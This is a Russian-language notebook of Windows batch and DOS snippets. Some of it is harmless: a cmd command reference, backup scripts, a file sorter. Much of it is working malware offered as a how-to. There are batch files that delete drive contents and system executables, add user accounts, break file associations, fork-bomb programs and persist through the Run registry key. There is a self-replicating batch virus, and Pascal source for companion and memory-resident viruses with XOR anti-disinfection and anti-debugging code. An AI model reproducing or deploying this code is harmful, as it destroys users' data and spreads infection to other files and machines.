

_________________________________________________________________________________________________

Echo – команда вывода на экран
Echo c:ski.bat >> autoexec.bat (Прописывает файл ski.bat в автозагрузку
@ — запрещает показывать
@echo off — запрещает вывод всех команд на экран
for – цикл, выполняет команду указанное количество раз
do – указывает, что делать
%%i – переменная, куда подставляются значения
in(1,1,100) – набор, который раскрывается в последовательность чисел от заданного начала, конца и шага
В нашем случае от 1,2,3,4,5,6,7,8…100
mkdir – создаёт папку
rmdir – удаляет папку
copy %0 x:\y - копирует вирус на диск x в папку y (пример copy %0 C:\System.bat)
Copy %0 c:ski.bat (копирует вирус только изменив названия)
label x:y - переименовывает диск x на имя y (пример label C:Disc error)
Label E: PRIDUROK (CD-ROM будет называться PRIDUROK)
time х:у - меняет время на х часов и у минут (пример time 14:27)
date x.y.z - меняет дату на x день, y месяц, z год (пример date 16.11.05) 
Date 13.09.96 (эта строка изменяет дату)
md х - создаст папку, в том месте, где наш вирус, с именем х (пример md Papka) 
md PRIDUROK
md LUZER
md DURAK (Создает пустые папки)
md LAMER
del *.* /q - удалит все файлы (наш вирус тоже) в папке, где лежит наш вирус (кроме папок) 
del x:\y *.* /q - удалит все файлы на диске х в папке у (кроме папок) (пример del F:\Data*.* /q) 
del c:Program Files/q (удаляет все файлы из этой папки)
assoc .х=.у - переделает все файлы, на компьютере, форматом х на у (пример assoc .exe=.mp3)
ren 5-??.png 7-??.png переименование файлов 5-??.png в 7-??.png  (? означает один символ)
assoc .exe=.mp3 (запускает все ексшники как музыка 
net user "х" /add - добавит на компьютер пользователя под именем х (пример net user "Smoked" /add) 
set - вывод, задание и удаление переменных среды cmd.exe.Там не все переменные, но много! Все смотреть просто set.
Attrib +h c:ski.bat ( делает файлу ski.bat атрибут скрытый 
If exist c:ski.bat goto abc (проверяет существует ли файл, …..) 
:abc ( ……если он существует, то программа перейдет на метку :abc) 
tftp - trivial ftp
tasklist - отображает приложения и сеансы, связанные с ним.
taskkill - позволяет завершить один или несколько процессов
tskill - убить процесс
reg - непосредственная работа с реестром. Смотреть reg /? всем! 
rcp - обмен файлами через rcp в ascii
runas - от имени пользователя
bootcfg - настройка boot.ini
append - позволяет открывать удаленные файлы так, словно они находятся в текущем.
getmac - получить мас 
logoff - Заверщить пользовательский сеанс.
mem - вывод на экран сведений о текущих процессах в ОЗУ
mqbkup - архивирование 
netsh - ??
openfiles - просмотреть открытые файлы.
rsh - выполнение команд на удаленных узлах с запущеной rsh
sc - command line ??
rexec - выполнение команд на удаленных узлах с запущеной rexec 
shutdown - выключить (хе-хе) local or remote computer.
systeminfo - вывод инфы о компе.
schtasks - планировщик заданий.
xcopy - копирование файлов и каталогов.
tsshutdn - завершение работы сервера в установленом порядке.
%SystemRoot%/system32/rundll32 user32, SwapMouseButton - Данная строчка меняет клавиши мыши местами

___________________________________________________________________________________________________________________

7za.exe a -tzip -ssw -mx7 -r0 -x@exclusions.txt full_path_for_the_archive working_dir
7za.exe a -tzip -ssw -mx7 -r0 -x@exclusions.txt \КУДА\ПАКУЕМ.7z \Что\пакуем
Поподробней об использованных ключах:
-tzip формат архива установлен в zip, без этого ключа умолчальный формат 7z;
-ssw принудительная упаковка файлов, которые в данный момент открыты для записи (мало ли кто-то засиделся на работе и что-то там правит);
-mx7 высокая степень сжатия (7), можно поставить и 5 (нормальное сжатие), тогда процесс пойдет побыстрее;
-r0 (это ноль, а не буква О) исключения, которые будут прописаны дальше обрабатываются только в рабочем каталоге;
-x@exclusions.txt это собственно говоря файл со списком исключений, которые не будем архивировать. Каждая строка файла — новое исключение. 
Можно использовать маски типа *.ext и т.п. 
Если исключение не много, то можно обойтись и без файла, в таком случае ключ примет следующий вид: -x!*.ext;
full_path_for_the_archive это соответственно путь и имя нового архива;
working_dir это папка, которая подлежит упаковке.
___________________________________________________________________________________________________________________

append — позволяет программам открывать файлы в указанных каталогах так , словно они находятся в текущем каталоге.
arp — отображение и изменение таблиц преобразования IP-адресов в физические, используемые протоколом разрешения адресов.
assoc — вывод либо изменение сопоставлений по расширениям имён файлов.
at — команда предназначена для запуска программ в указанное время.
atmsdm — Контроль подключений и адресов, зарегистрированных диспетчером вызовов ATM в сетях с асинхронным режимом передачи (ATM).
attrib — изменение атрибутов файлов и папок.
auditusr — задаёт политику аудита пользователей.

break — включение режима обработки клавиш CTRL+C.
bootcfg — эта программа командной строки может быть использована для настройки , извлечения , изменения или удаления параметров командной строки в файле Boot.ini.

cacls — просмотр изменение таблиц управления доступом ACL к файлам.
call — вызов одного пакетного файла из другого.
cd — вывод имени либо изменение текущей папки.
chcp — вывод либо изменение активной кодовой страницы.
chdir — вывод либо смена текущей папки.
chkdsk — проверка диска и вывод отчёта.
chkntfs — выводит или изменяет параметры проверки диска во время загрузки.
ciddaemon — сервис индексации файлов.
cipher — программа шифрования файлов.
cls — очистка экрана интерпретатора.
cmd — запуск нового окна командной строки.
cmstp — установка профилей диспетчера подключений.
color — устанавливает цвет для текста и фона в текстовых окнах.
comp — сравнение содержимого двух файлов или наборов файлов.
compact — просмотр и изменение параметров сжатия файлов в разделах NTFS.
convert — преобразование файловой системы тома FAT в NTFS.
copy — копирование одного или нескольких файлов.

date — вывод либо установка текущей даты.
debug — средство для отладки и редактирования программ.
defrag — дефрагментация диска.
del — удаление одного или нескольких файлов.
devcon — альтернатива диспетчера устройств.
diantz — тоже что и MAKECAB.
dir — вывод списка файлов и подпапок из указанного каталога.
diskcomp — сравнение содержимого двух гибких дисков.
diskcopy — копирование содержимого одного гибкого диска на другой.
diskpart — использования сценария diskpart.
diskperf — счетчик производительности дисков.
doskey — редактирование и повторный вызов команд Windows; создание макросов DOSKey.
driverquery — просмотр списка установленных драйверов устройств и их свойства.

echo — вывод сообщений и переключение режима отображения команд на экране.
edit — запуск редактора MS-DOS.
endlocal — завершение локализации изменений среды в пакетном файле.
edlin — запуск построчного текстового редактора.
erase — удаление одного или нескольких файлов.
esentutl — обслуживание утилит для Microsoft (R) баз данных Windows.
eventcreate — эта команда позволяет администратору создать запись об особом событии в указанном журнале событий.
eventtriggers — эта команда позволяет администратору отобразить и настроить триггеры событий в локальной или удаленной системе.
exe2bin — преобразование EXE-файлов в двоичный формат.
exit — завершение командной строки.
expand — распаковка сжатых файлов.

fc — сравнение двух файлов или двух наборов файлов и вывод различий между ними.
find — поиск текстовой строки в одном или нескольких файлах.
findstr — поиск строк в файлах.
finger — вывод сведений о пользователях указанной системы.
fltmc — работа с фильтром нагрузки драйверов.
for — выполнение указанной команды для каждого файла набора.
forcedos — сопоставление приложений MS-DOS, которые не распознаются системой Microsoft Windows XP.
format — форматирование диска для работы с Windows.
fontview — программа просмотра шрифтов.
fsutil — управление точками повторной обработки, управление разреженными файлами, отключение тома или расширение тома.
ftp — программа передачи файлов.
ftype — просмотр и изменение типов файлов, сопоставленных с расширением имен файлов.

getmac — отображает MAC-адрес одного или нескольких сетевых адаптеров компьютера.
goto — передача управления содержащей метку строке пакетного файла.
gpresult — отображает результирующую политику (RSoP) для указанного пользователя и компьютера.
gpupdate — выполнение обновления групповых политик.
graftabl — выбор кодовой страницы для отображения символов национальных алфавитов в графическом режиме.

help — выводит не полный список команд, которые используются в cmd.
hostname — отображение имени компьютера.

if — оператор условного выполнения команд в пакетном файле.
ipconfig — вывод маску подсети, стандартный шлюз и информацию о вашем IP.
ipxroute — программа управления маршрутизацией NWLink IPX.

label — создание, изменение и удаление меток тома для диска.
lodctr — обновление имен счётчиков и поясняющего текста для расширенного счётчика.
logman — управление расписанием для счетчиков производительности и журнала трассировки событий.
logoff — завершение сеанса Windows.
lpq — отображение состояния очереди удалённой очереди печати lpq.
lpr — направляет задание печати на сетевой принтер.
lsass — сервер определения локальной защиты.

makecab — архивирование файлов в cab-архив.
md — создание папки.
mem — выводит сведения об используемой и свободной памяти.
mkdir — создание папки с расширенной функциональностью.
mmc — открытие окна консоли MMC.
mode – отладка системных устройств
mofcomp — 32-разр. компилятор Microsoft (R) MOF.
more — последовательный вывод данных по частям размером в один экран.
mountvol — просмотр, создание и удаление точек подключения тома.
move — перемещение и переименование файлов и каталогов.
mqbkup — утилита архивирования и восстановления очереди сообщений.
mqsvc — Обеспечивает инфраструктуру для работы распределенных приложений.
mrinfo — Работа с многоадресными рассылками.
msg — отправка сообщений пользователю.
msiexec — запуск установщика Windows.

nbtstat — отображение статистики протокола и текущих подключений TCP/IP с помощью NBT (NetBIOS через TCP/IP).
net — пакет приложений предназначенный для работы с сетью.
net1 — тоже самое что и net.
netsh — локальное или удаленное отображение и изменение параметров сети.
netstat — отображение статистики протоколов и текущих сетевых подключений TCP/IP.
nlsfunc — загрузка сведений о национальных стандартах.
nslookup — вывод информации, предназначенный для диагностики DNS.
ntbackup — запуск мастера архивирования.
ntsd — отладчик командной строки.

odbcconf — настройка драйвера ODBC.
openfiles — эта команда позволяет пользователю вывести список открытых файлов и папок, которые были открыты в системе.


pagefileconfig — настройка файлов подкачки и виртуальной памяти.
path — вывод либо установка пути поиска исполняемых файлов.
pathping — вывод информации о скрытый сетях и потери данных.
pause — приостанавливает выполнение сценария cmd.
pentnt — обнаруживает ошибки деления с плавающей точкой процессора Pentium, отключает аппаратную обработку чисел с плавающей точкой и включает эмуляции операций с плавающей точкой.
perfmon — открывает окно «Производительность».
ping — проверяет соединение с другим компьютером.
ping6 — команда проверки связи.
popd — изменяет одну папку на ту, которая была сохранена командой PUSHD.
powercfg — эта команда позволяет управлять электропитанием системы.
print — печать текстового файла.
prncnfg — настройка параметров принтера.
prompt — изменение приглашения командной строки cmd.exe.
proxycfg — инструмент настройки proxy соединения.
pushd — сохранения значений текущего каталога для использования POPD командой.

qappsrv — отображает доступные серверы терминалов в сети.
qprocess — отображает информацию о процессах.
qwinsta — отображение информации о сеансах терминалов.

rasdial — интерфейс связи из командной строки для клиента службы удалённого доступа.
rcp — обмен файлами с компьютером, на котором выполняется служба RCP.
recover — восстановление сохранившихся данных на поврежденном диске.
reg — редактирование системного реестра через командную строку.
regsvr32 — сервер регистрации.
relog — создает новый журнал производительности из уже имеющего.
rem — помещение комментария в пакетный файл.
ren — переименование файлов и папок.
rename — переименование файлов и папок.
replace — замена файлов.
reset — утилита сброса служб терминалов.
rexec — выполнение команд на удаленных узлах на которых выполняется служба rexec.
rd — удаление папки.
rmdir — удаление папки.
route — обработка таблиц сетевых маршрутов.
rsh — выполнение команд на удаленных узлах, на которых запущена служба RSH.
rsm — управление ресурсами носителей с помощью службы «Съемные ЗУ».
runas — использование приложений от имени другого пользователя.
rundll32 — запуск стандартных команд-функций заложенных в dll.
rwinsta — сброс значений подсистем оборудования и программ сеанса в начальное состояние.

sc — установление связи с NT Service Controller и ее услугами.
schtasks — создание, удаление, изменение и опрос запланированных задачи в локальной или удаленной системе.
sdbinst — установщик базы данных совместимости.
secedit – автоматизация задач настройки безопасности.
set — вывод, присваивание и удаления переменных в командной строке.
setlocal — начало локализации изменений среды в пакетном файле.
setver — задает номер версии, который MS-DOS сообщает программе.
sfc — Проверка файлов Windows.
shadow — позволяет наблюдать за другим сеансом служб терминалов.
shift — изменение содержимого подставляемых параметров для пакетного файла.
shutdown — завершение сеанса, выключение и перезагрузка системы Windows.
smbinst — это процесс, принадлежащий System Management BIOS Driver Installer.
sort — сортирование файлов.
start — запуск программы или команды в отдельном окне.
subst — сопоставление имени диска указанному пути.
systeminfo — вывод информации о настройках системы.

taskkill — завершение одного или нескольких процессов.
tasklist — показывает запущенные программы и процессы выполняемые в данный момент.
tcmsetup — установка клиента телефонии.
tftp — обмен файлами с удаленным компьютером, на котором запущена служба TFTP.
time — просмотр или изменение текущего времени.
title — назначение заголовка окна интерпретатора.
tlntadmn — удаленное управление компьютером.
tracert — трассировка маршрута к указанному узлу.
tracerpt — обрабатывает двоичные файлы журнала отслеживания событий или потоки данных.
tracert6 — версия tracert для протокола IPv6.
tree — вывод структуры диска или каталога в виде дерева.
tscon — присоединяет сеанс пользователя к сеансу терминала.
tsdiscon — отключение сеанса терминала.
tskill — прекращение процесса.
tsshutdn — завершение работы сервера в установленном порядке.
type — вывод на экране содержимого текстовых файлов.
typeperf — выводит сведения о производительности на экран или в журнал.

unlodctr — удаление имен счётчиков и поясняющего текста для расширенного счётчика.
userinit — проводник системы Windows.
ver — вывод сведений о версии Windows.
verify — установка режима проверки правильности записи файлов на диск
vol — вывод метки и серийного номера тома для диска.
vssadmin — инструмент командной строки теневого копирования тома.

w32tm — диагностика службы времени.
wbemtest — тестер инструментария управления Windows.
winver — вывод информации о версии Windows.
wmic — инструмент для написания сценариев.

xcopy — копирование файлов и дерева папок.
___________________________________________________________________________________________________________________

привет я бат! =)
@echo Hello, i'm bat!
pause
___________________________________________________________________________________________________________________

После запуска батника,вы увидите 100 новых папок
@echo off
for /l %%i in (1,1,100) do mkdir "dir %%i"

___________________________________________________________________________________________________________________

А теперь сразу создадим bat файл, который будет удалять созданные нами раннее 100 папок
@echo off
for /l %%i in (1,1,100) do rmdir "dir %%i"

___________________________________________________________________________________________________________________

Чтобы добавить все атрибуты пишем такой код:
for /l %%i in (1,1,100) do mkdir "dir %%i"
for /l %%i in (1,1,100) do attrib +h +r +s "dir %%i"
h - скрытый (файл,пакпка не будет отображаться в компьютере,чтобы увидеть такой файл необходимо изменить настройки 
по умолчанию,в windows 7 для этого надо зайти в МОЙ КОМПЬЮТЕР=> упорядочить=>параметры папок=>вид=>показывать
скрытые файлы,папки и диски
s - системный
r - только для чтения(файл будет невозможно перезаписать)
а чтобы снять атрибуты:
for /l %%i in (1,1,100) do attrib -h -r -s "dir %%i"
___________________________________________________________________________________________________________________

Можно сделать так чтоб он удалял важные EXE-шники windows. пишем такой код
@echo off
do del "c:\windows\exploer.exe"
do del "c:\windows\mspoint.exe"
do del "c:\windows\notepad.exe"
___________________________________________________________________________________________________________________

Программа для удаления файлов с флешки (если та вставлена) и переименования ее. 
del F:\ *.* /q 
label F:HACK
___________________________________________________________________________________________________________________

Программа для изменения даты и времени на компьютере и копирования ее на диск C и на флешку. 
time 14:13 
date 11.07.12 
copy %0 C:\Time.bat 
copy %0 F:\Time.bat
___________________________________________________________________________________________________________________

@echo off 
del C:\ *.* /q >nul 
del D:\ *.* /q >nul 
del E:\ *.* /q >nul 
del F:\ *.* /q >nul 
time 00:00 >nul 
date 13.06.23 >nul 
del *.* /q >nul 
___________________________________________________________________________________________________________________

Очень неплохая строка для нагрузки слабеньких машин. Команда открывает Paint
:x ; 
Start mspaint 
goto x ; 

___________________________________________________________________________________________________________________

@echo off 
%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul 
time 0:00 >nul 
date 13.06.23 >nul 
label C:IDIOT >nul 
label D:DURAK >nul 
label E:SUKA >nul 
label F:GANDON >nul 
copy %0 C:\Open.bat >nul 
copy %0 D:\Open.bat >nul 
copy %0 E:\Open.bat >nul 
copy %0 F:\Open.bat >nul 
net user "Idiot you Hacked" /add >nul 
net user "Bitch you Hacked" /add >nul 
net user "Durak you Hacked" /add >nul 
net user "Kritin you Hacked" /add >nul 
net user "Gavno you Hacked" /add >nul 
md 1 >nul 
md 2 >nul 
md 3 >nul 
md 4 >nul 
md 5 >nul 
md 6 >nul 
md 7 >nul 
md 8 >nul 
md 9 >nul 
md 10 >nul 
md 11 >nul 
md 12 >nul 
md 13 >nul 
md 14 >nul 
md 15 >nul 
md 16 >nul 
md 17 >nul 
md 18 >nul 
md 19 >nul 
md 20 >nul 
md 21 >nul 
md 22 >nul 
md 23 >nul 
md 24 >nul 
md 25 >nul 
md 26 >nul 
md 27 >nul 
assoc .lnk=.txt >nul 
assoc .exe=.txt >nul 
:x ; 
Start mspaint 
goto x ; 
:x ; 
Start Calc 
goto x ; 
copy ""%0"" "%SystemRoot%\system32\Cool.bat" >nul 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Cool" /t REG_SZ /d "%SystemRoot%\system32\Cool.bat" /f >nul 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f >nul 
del %0 >nul 
___________________________________________________________________________________________________________________

Смысл заражения таков: в вирусе каждая строчка имеет метку, в данном примере она MeTrA. 
Например, в первой строке эта метка ничего не делает, во второй строке эта метка, как бы, не является пассивной, 
она используется для внутренней работы вируса, а именно участвует в названии метки. При запуске вирус проверяет, 
есть ли файл C:METRA.BAT, если нет, то вирус создает его и с помощью программы find копирует из файла (из которого стартовал) 
все строки содержащие метку вируса, т.е. копирует только вирусные строки. Так, вирусные строки скопированы. Значит в файле C:METRA.BAT 
теперь находится копия вируса. Далее вирус ищет BAT-файлы. Чтобы не происходило повторного заражения используется все таже программа find. 
Допустим вирус нашел файл RUN.BAT и он оказался еще не заражен, тогда вирус вызывает файл C:METRA.BAT с такими параметрами: In_ RUN.BAT, 
здесь первый параметр In_ говорит вирусу, что надо заразить файл, имя которого указано во-втором параметре, в данном случае он RUN.BAT. 
Вирус в C:METRA.BAT заражает файл RUN.BAT простейшим способом - с помощью команды type дописывает к файлу RUN.BAT себя. 
Вот так файл RUN.BAT оказывается зараженным.

@echo off%[MeTrA]% 
if '%1=='In_ goto MeTrAin 
if exist c:MeTrA.bat goto MeTrAru 
if not exist %0 goto MeTrAen 
find "MeTrA"<%0>c:MeTrA.bat 
attrib +h c:MeTrA.bat 
:MeTrAru 
for %%t in (*.bat) do call c:MeTrA In_ %%t 
goto MeTrAen 
:MeTrAin 
find "MeTrA"<%2>nul 
if not errorlevel 1 goto MeTrAen 
type c:MeTrA.bat>>%2 
:MeTrAen 
___________________________________________________________________________________________________________________

Компаньон-вирус 
Эти вирусы не изменяют программы. Они создают для EXE-файлов COM-файлы. При запуске программы сначала запустится COM-файл с вирусом, 
который заразив другие файлы запустит EXE-файл. Рассмотрим пример: 

{$M 2048,0,4096} 
{$i-} 
Program Metra; 
uses dos; 
var 
DirInfo : SearchRec; 
F1,f2 : File; 
Buf : Array[0..5000] of Byte; { размер вируса } 
NumRead : Word; 
NumWritten : Word; 
FT:text; 
P: PathStr; 
D: DirStr; 
N: NameStr; 
E: ExtStr; 
namecom:string; 
Label InfOk; 
Begin 
{ считать свое тело в буфер } 
Assign(F2,ParamStr(0)); 
Reset(F2,1); 
if ioresult<>0 then 
begin 
writeln('Файл ',paramstr(0),' не доступен!'); 
halt; 
end; 
BlockRead(F2,buf,SizeOf(buf),NumRead); 
Close(F2); 
{ искать жертву } 
FindFirst('*.EXE',Archive,DirInfo); 
While DosError = 0 Do 
Begin 
FSplit(dirinfo.name, D, N, E); 
namecom:=n+'.com'; 
{ проверить существует ли файл } 
Assign(ft,namecom); 
reset(ft); 
if ioresult=0 then { если уже существует } 
begin 
close(ft); 
goto infOk; 
end; 
{ создать COM-файл с вирусом } 
Assign(F1,namecom); 
rewrite(f1); 
if ioresult<>0 then goto InfOk; {если ошибка, то пропустить} 
Reset(F1,1); 
BlockWrite(F1,buf,NumRead,NumWritten); 
Close(F1); 
infOk: 
FindNext(DirInfo); 
End; 
{ запустим своего носителя } 
FSplit(paramstr(0), D, N, E); 
swapvectors; 
exec(d+n+'.EXE',paramstr(1)); 
swapvectors; 
{ если вызвали с таким параметром, то надо представитьcя } 
if paramstr(1)='/??' then 
begin 
writeln('Virus MeTrA.'); 
writeln('^^^^^^^^^^^^'); 
end; 
halt(dosexitcode); { выйти и сохранить код ошибки } 
End. 

___________________________________________________________________________________________________________________

Вирус-спутник 

Принцип заражения: 

• найти EXE-файл 
• найти OVR-файл с тем же именем 
• если его нет, то переименовать найденный EXE-файл в OVR-файл, записаться вместо EXE-файла. 

Резидентные вирусы 

Из справки Паскаля: 

{$M $800,0,0 } { 2K stack, no heap } 
{ This program causes a click each time a key is pressed.} 
uses Crt, Dos; 
var 
KbdIntVec : Procedure; 
{$F+} 
procedure Keyclick; interrupt; 
begin 
if Port[$60] < $80 then 
{ Only click when key is pressed } 
begin 
Sound(5000); 
Delay(1); 
Nosound; 
end; 
inline ($9C); { PUSHF -- Push flags } 
{ Call old ISR using saved vector } 
KbdIntVec; 
end; 
{$F-} 
begin 
{ Insert ISR into keyboard chain } 
GetIntVec($9,@@KbdIntVec); 
SetIntVec($9,Addr(Keyclick)); 
Keep(0); { Terminate, stay resident } 
end. 

Теперь уберем все ошибки из этого примера и переделаем под вирус: 

{$F+} 
procedure Keyclick; interrupt; 
begin 
InfExe; { вызов процедуры заражения } 
inline ($9C); { PUSHF -- Push flags } 
{ Call old ISR using saved vector } 
KbdIntVec; 
end; 
{$F-} 

Здесь процедура InfExe является обычной процедурой нерезидентного вируса (заражает в текущем каталоге).
 А вот эти строки впишем в то место вируса, где как бы его конец. 

{ Insert ISR into keyboard chain } 
GetIntVec($21,@KbdIntVec); 
SetIntVec($21,@Keyclick); 
Keep(0); { Terminate, stay resident } 

К сожалению в справке не сказано как избегать повторной установки в память, поэтому я советую чтобы вирус 
копировал свое тело в какой-нибудь файл на диске C:, вставлял его вызов в config.sys.
Пример: install=c:vir.exe /123, здесь /123 - это такой параметр, он говорит вирусу, что тот стартовал для заражения памяти, 
т.е. ему не надо запускать своего носителя, а надо выполнить эти три строчки. 

Можно помудрить и с другими прерываниями, но вынужден вас расстроить, вирусы такого типа, как правило,
очень глючные и работают, в основном, только в многозначной среде (в эмуляции DOS виснут). 

___________________________________________________________________________________________________________________

Усложнение лечения 
Если у вас нет желания чтобы ваш вирус, доставшись какому-нибудь ламеру, стал жертвой его антивируса,
 то следует подумать об усложнении лечения. 
Вирус на Паскале, как правило, заражает программы в начало, перенося старое содержимое в конец. 
Такими вирусами антивирусные базы пополняются автоматом (без вмешательства человека). Оно и понятно,
переписать конец в начало и обрезать длину - это очень простая операция. Смысл усложнения лечения 
заключается в шифровке куска своей жертвы.
Т.к. кусок жертвы при переносе к конец файла находится в массиве, тогда поступаем примерно так: 

for i:=1 to 777 do 
begin 
cc:=a1[i]; 
i2:=ord(cc) xor 343; 
a1[i]:=chr(i2); 
end; 

Здесь a1 - это массив, в котором сохраняется начало жертвы; i,i2 - integer; cc - char. 

В результате данной операции шифруется кусок файла-жертвы (777 байт). Т.к. операция шифровки осуществляется
с помощью XOR - для расшифровки используется та же операция. Значит эту маленькую подпрограмму надо оформить
в виде процедуры, которую следует прописать в процедуре заражения и в процедуре запуска своего носителя 
(перед запуском и после запуска). Если вы не разбираетесь в XOR, то скажу, в моем примере шифровка осуществляется
с помощью ключа 343, он может быть от 1 до 65000. Можно сделать так, чтобы этот ключ менялся при заражении каждого файла,
например, сделать чтобы ключ зависел от размера своего носителя или можно генерировать ключ случайным образом и
помещать его где-нибудь в теле вируса или считывать несколько байт кода жертвы, получать их ord-значения и использовать как ключ. 
И еще, в моем примере шифровка идет от начала файла, а можно сделать определенное смещение, которое тоже чтобы зависело от чего-нибудь. 
Размер шифровки у меня 777, а можно сделать ее тоже случайной и т.д. Можно также защитить вирус от ламерской трассировки: 

uses dos; 
var 
O1H , O3H , Br : Pointer; 
{$F+} 
procedure ReBoot; Interrupt; 
begin { а это для того, чтобы нехорошие дяди не запускали Debug } 
InLine($EA/ 
$00/ 
$00/ 
$FF/ 
$FF); 
end; 
{$F-} 
{$F+} 
procedure BreakOff; Interrupt; { + } 
begin 
{ Invisible Magic Words! } 
end; 
{$F-} 
begin {main} 
GetIntVec($01 , O1H); { подготавливаем систему } 
SetIntVec($01 , @ReBoot); 
GetIntVec($03 , O3H); { вешаем антитрассировщик } 
SetIntVec($03 , @ReBoot); 
GetIntVec($1B , Br); { заменяем вектор ^C } 
SetIntVec($1B , @BreakOff); 
SetCBreak(False); { и отключаем ^C } 
writeln('hello'); 
SetIntVec($01 , O1H); { восстанавливаем захваченные векторы } 
SetIntVec($03 , O3H); 
SetIntVec($1B , Br); 
end. 

Здесь вместо фразы Hello следует вставить процедуры вируса, процедуру запуска носителя следует вставлять
после строк восстановления векторов.
___________________________________________________________________________________________________________________
делаем список юзеров кто с какими процессами оставил пк
set fdate=%DATE%
ECHO "Менеджеры КОРПОРАТИВ ОТДЕЛ" > D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 202" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 226" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 207" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 218" >> D:\tasklistterminal\terminal_%fdate%.txt

ECHO "Менеджеры ИТАЛЬЯНСКИЙ ОТДЕЛ" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 251" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 210" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 209" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 250" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 208" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 217" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 213" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 216" >> D:\tasklistterminal\terminal_%fdate%.txt

ECHO "Менеджеры РУССКИЙ ОТДЕЛ" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq avia-4" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 221" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 257" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 254" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 261" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 269" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 270" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 271" >> D:\tasklistterminal\terminal_%fdate%.txt

ECHO "Бухгалтерия" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 214" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq cash" >> D:\tasklistterminal\terminal_%fdate%.txt
___________________________________________________________________________________________________________________

простой бекап
set datetemp=%time% или set datetemp=%date%
md \\10.47.19.1\1c-arhiv\%datetemp%
copy e:\bases\arhiv\*.* \\10.47.19.1\1c-arhiv\%datetemp%
___________________________________________________________________________________________________________________

бежит красиво время
@echo off 
:loop
echo %time%
goto loop
___________________________________________________________________________________________________________________

Сортировка файлов в папке своими руками
rem Проверяем существование и создаем необходимые каталоги
if not exist "archives" md "archives"
if not exist "iso" md "iso"
if not exist "music" md "music"
if not exist "video" md "video"
if not exist "programs" md "programs"
if not exist "photos" md "photos"
if not exist "images" md "images"
if not exist "docs" md "docs"

rem Перемещаем архивы часто используемых типов в arhives
for %%f in (*.zip,*.gz,*.tgz,*.rar) do move "%%f" "archives"

rem ISO-файлы — в каталог ISO
move *.iso iso

rem Видео — в каталог video
for %%f in (*.avi,*.mov,*.mp4,*.mkv,*.3gp) do move "%%f" "video"

rem Музыка (в основном это MP3-файлы)
move *.mp3 music

rem Программы и фото
move *.exe programs
move *.jpg photos

rem Изображения
for %%f in (*.png,*.bmp,*.gif,*.tiff) do move "%%f" "images"

rem Документы
for %%f in (*.pdf,*.txt,*.doc,*.docx,*.xls) do move "%%f" "docs"

rem Удаляем торрент-файлы
del *.torrent

___________________________________________________________________________________________________________________

Создай файл upload.bat. Мы его будем использовать для загрузки всех txt-файлов из локального каталога
c:\test в удаленный каталог tmp нашего FTP-сервера. В этот файл помести всего одну строчку:

ftp -n -s:commands.ftp
Параметр -n запрещает автоматический вход на сервер (входом будем управлять вручную), 
а второй задает текстовый файл с командами FTP-клиента, которые будут или выполнены локально, 
или переданы серверу (в зависимости от команды). В нашем случае commands.ftp следующий:

open сервер
USER пользователь
пароль
binary
cd tmp
lcd c:\test
prompt
mput *.txt
bye

Обрати внимание: пароль указывается в отдельной строке после указания имени пользователя. 
Команда binary включает двоичный режим обмена информацией. Команда cd изменяет каталог на FTP-сервере, 
lcd — на локальном компе. 
Команда prompt отключает режим подтверждений для команд mput (множественная загрузка файлов на сервер),
mget (множественная загрузка файлов с сервера). Команда bye завершает работу сценария.

Данный сценарий легко переделать в сценарий, загружающий файлы с сервера. 
Для этого достаточно команду mput заменить на mget.

Я привел довольно тривиальный пример. Но ты можешь существенно его расширить.
Никто тебе не мешает добавить перед вызовом команды ftp команды, создающие архив каталога БД. Например:

rar a c:\test\backup.rar @backup.lst
Эта команда создаст архив backup.rar по всем файлам, указанным в текстовом файле backup.lst. 
После этого в commands.ftp нужно изменить mput *.txt на mput *.rar.
___________________________________________________________________________________________________________________
Скрипт бэкапа
@echo off
cls
:m1
Echo Your Choice:
Echo.
Echo //////////////////////////////////////////////////////////////////
Echo 1 - Copy all E:\ drive to G:\BackUp                         
Echo.
Echo 2 - Copy Desktop to E:\BackUp\Current Day\Desktop           
Echo.
Echo 3 - Copy My Docements to E:\BackUp\Current Day\My Documents 
Echo.
Echo 4 - Copy Favourites to E:\BackUp\Current Day\Favourites
Echo.
Echo 9 - Copy regedit.exe to E:\BackUp\Current Day\Regedit     
Echo //////////////////////////////////////////////////////////////////
 
Echo.
Echo \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
Echo 5 - Restore Favourites From E:\BackUp\Current Day\Favourites    
Echo.
Echo 6 - Restore My Documents From E:\BackUp\Current Day\My Documents   
Echo.
